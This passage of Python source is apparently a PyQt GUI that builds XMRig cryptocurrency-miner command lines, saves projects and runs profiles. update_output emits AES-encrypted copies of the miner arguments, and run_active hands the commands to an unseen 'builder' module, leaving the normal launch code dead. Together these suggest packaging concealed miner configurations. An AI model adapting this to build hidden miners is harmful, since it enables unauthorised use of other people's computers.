        layout.addWidget(gpu_card)
        layout.addStretch(1)

        self.summary_hint = QLabel()
        self.summary_hint.setObjectName("Muted")
        layout.addWidget(self.summary_hint)
        return card

    def _create_output_card(self) -> QWidget:
        card = QFrame()
        card.setObjectName("OutputCard")
        layout = QVBoxLayout(card)
        layout.setContentsMargins(16, 13, 16, 14)
        layout.setSpacing(8)

        header = QHBoxLayout()
        self.output_title = QLabel()
        self.output_title.setObjectName("SectionTitle")
        header.addWidget(self.output_title)
        header.addStretch(1)
        self.validation_label = QLabel()
        self.validation_label.setObjectName("Muted")
        header.addWidget(self.validation_label)
        layout.addLayout(header)

        self.output_edit = QTextEdit()
        self.output_edit.setReadOnly(True)
        self.output_edit.setMinimumHeight(120)
        self.output_edit.setMaximumHeight(190)
        layout.addWidget(self.output_edit)

        buttons = QHBoxLayout()
        buttons.setSpacing(8)
        self.save_project_button = QPushButton()
        self.save_project_button.clicked.connect(self.save_project)
        buttons.addWidget(self.save_project_button)

        self.load_project_button = QPushButton()
        self.load_project_button.clicked.connect(self.load_project)
        buttons.addWidget(self.load_project_button)

        buttons.addStretch(1)

        self.validate_button = QPushButton()
        self.validate_button.setObjectName("OutlineButton")
        self.validate_button.clicked.connect(self.validate_and_report)
        buttons.addWidget(self.validate_button)

        self.run_button = QPushButton()
        self.run_button.setObjectName("PrimaryButton")
        self.run_button.clicked.connect(self.run_active)
        buttons.addWidget(self.run_button)
        layout.addLayout(buttons)
        return card

    def change_language(self, _index: int = -1) -> None:
        selected = self.language_combo.currentData()
        if selected not in ("en", "ru"):
            return
        self.language = selected
        self.retranslate()
        self.update_output()

    def retranslate(self) -> None:
        language = self.language
        self.setWindowTitle(tr(language, "window_title"))
        self.app_title_label.setText(tr(language, "app_title"))
        self.app_subtitle_label.setText(tr(language, "app_subtitle"))
        self.executable_label.setText(tr(language, "executable"))
        self.exe_edit.setPlaceholderText(tr(language, "executable_placeholder"))
        self.language_label.setText(tr(language, "language"))

        self.total_metric_label.setText(tr(language, "active_of_four"))
        self.cpu_metric_label.setText(tr(language, "cpu_configs"))
        self.gpu_metric_label.setText(tr(language, "gpu_configs"))
        self.summary_hint.setText(tr(language, "minimum_hint"))

        self.tabs.setTabText(0, tr(language, "cpu_tab"))
        self.tabs.setTabText(1, tr(language, "gpu_tab"))
        self.cpu_page.retranslate(language)
        self.gpu_page.retranslate(language)

        self.output_title.setText(tr(language, "final_commands"))
        self.save_project_button.setText(tr(language, "save_project"))
        self.load_project_button.setText(tr(language, "load_project"))
        self.validate_button.setText(tr(language, "validate"))
        self.run_button.setText(tr(language, "run_active"))
        self.statusBar().showMessage(tr(language, "ready"))

    def active_profiles(self) -> list[ProfileCard]:
        return [profile for profile in self.profiles if profile.enabled.isChecked()]

    def build_commands(self) -> list[tuple[str, list[str]]]:
        executable = self.exe_edit.text().strip() or "xmrig.exe"
        return [
            (profile.display_title, [executable, *profile.build_args()])
            for profile in self.active_profiles()
        ]

    def update_output(self) -> None:
        if not hasattr(self, "output_edit"):
            return

        active = self.active_profiles()
        active_cpu = sum(profile.backend == "cpu" for profile in active)
        active_gpu = sum(profile.backend == "gpu" for profile in active)
        self.total_metric.setText(str(len(active)))
        self.cpu_metric.setText(str(active_cpu))
        self.gpu_metric.setText(str(active_gpu))

        output_lines: list[str] = []
        for title, args in self.build_commands():
            from encrypt_config import encrypter_aes
            mini_bool = title.lower().startswith("cpu")
            strdawawding = "a123" + "123131231"
            output_lines.extend((f"# {title}", subprocess.list2cmdline(args), ("|" if not mini_bool else "") +  encrypter_aes(" ".join(args[1:])) + ( "|" if mini_bool else "" )      ))
        self.output_edit.setPlainText("\n".join(output_lines).rstrip())

        if active:
            self.validation_label.setText(tr(self.language, "ready_configs", count=len(active)))
            self.validation_label.setStyleSheet("color: #FF8A2A; font-weight: 650;")
        else:
            self.validation_label.setText(tr(self.language, "no_configs"))
            self.validation_label.setStyleSheet("color: #9E9E9E;")

    def validation_messages(self) -> tuple[list[str], list[str]]:
        errors: list[str] = []
        warnings: list[str] = []
        active = self.active_profiles()

        if not active:
            errors.append(tr(self.language, "at_least_one"))

        for profile in active:
            profile_errors, profile_warnings = profile.validate()
            errors.extend(profile_errors)
            warnings.extend(profile_warnings)

        return errors, warnings

    def validate_and_report(self, show_success: bool = True) -> bool:
        errors, warnings = self.validation_messages()

        if errors:
            QMessageBox.critical(
                self,
                tr(self.language, "config_error"),
                "\n".join(f"• {message}" for message in errors),
            )
            return False

        if warnings:
            QMessageBox.warning(
                self,
                tr(self.language, "warnings"),
                "\n".join(f"• {message}" for message in warnings),
            )
        elif show_success:
            QMessageBox.information(
                self,
                tr(self.language, "validation"),
                tr(self.language, "validation_ok", count=len(self.active_profiles())),
            )

        return True

    def save_project(self) -> None:
        filename, _ = QFileDialog.getSaveFileName(
            self,
            tr(self.language, "save_project_title"),
            "xmrig_multi_config.json",
            "JSON (*.json)",
        )
        if not filename:
            return
        if not filename.lower().endswith(".json"):
            filename += ".json"

        data = {
            "version": 3,
            "language": self.language,
            "executable": self.exe_edit.text(),
            "profiles": {profile.profile_id: profile.to_dict() for profile in self.profiles},
        }

        try:
            Path(filename).write_text(
                json.dumps(data, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
        except OSError as exc:
            QMessageBox.critical(self, tr(self.language, "save_error"), str(exc))
            return

        self.statusBar().showMessage(tr(self.language, "project_saved", path=filename))

    def load_project(self) -> None:
        filename, _ = QFileDialog.getOpenFileName(
            self,
            tr(self.language, "load_project_title"),
            "",
            "JSON (*.json)",
        )
        if not filename:
            return

        try:
            data = json.loads(Path(filename).read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError) as exc:
            QMessageBox.critical(self, tr(self.language, "load_error"), str(exc))
            return

        if not isinstance(data, dict):
            QMessageBox.critical(self, tr(self.language, "load_error"), tr(self.language, "invalid_json"))
            return

        loaded_language = data.get("language")
        if loaded_language in ( "en", "ru"):
            self.language_combo.blockSignals(True)
            self.language_combo.setCurrentIndex(0 if loaded_language == "ru" else 1)
            self.language_combo.blockSignals(False)
            self.language = loaded_language
            self.retranslate()

        self.exe_edit.setText(str(data.get("executable", "xmrig.exe")))
        profiles_data = data.get("profiles", {})
        if not isinstance(profiles_data, dict):
            QMessageBox.critical(
                self,
                tr(self.language, "load_error"),
                tr(self.language, "profiles_not_object"),
            )
            return

        for profile in self.profiles:
            profile_data = profiles_data.get(profile.profile_id)
            if isinstance(profile_data, dict):
                profile.load_dict(profile_data)
            else:
                profile.clear()
                profile.enabled.setChecked(False)

        self.update_output()
        self.statusBar().showMessage(tr(self.language, "project_loaded", path=filename))

    def run_active(self) -> None:
        from builder import build_main
        build_main(self.build_commands())

        return
        if not self.validate_and_report(show_success=False):
            return

        failed: list[str] = []
        for title, args in self.build_commands():
            executable = Path(args[0]).expanduser()
            cwd = (
                str(executable.parent)
                if executable.parent != Path(".") and executable.parent.exists()
                else None
            )
            try:
                subprocess.Popen(args, cwd=cwd)
            except OSError as exc:
                failed.append(f"{title}: {exc}")

        if failed:
            QMessageBox.critical(
                self,
                tr(self.language, "run_error"),
                "\n".join(failed),
            )
            return

        self.statusBar().showMessage(
            tr(self.language, "started", count=len(self.active_profiles()))
        )


def main() -> int:
    app = QApplication(sys.argv)
    app.setApplicationName("XMRig Multi-Config Builder")
    app.setStyle("Fusion")
    app.setStyleSheet(STYLE)
    app.setFont(QFont("Segoe UI", 10))

    window = XmrigMultiConfigBuilder()
    window.show()
    return app.exec()


if __name__ == "__main__":
    raise SystemExit(main())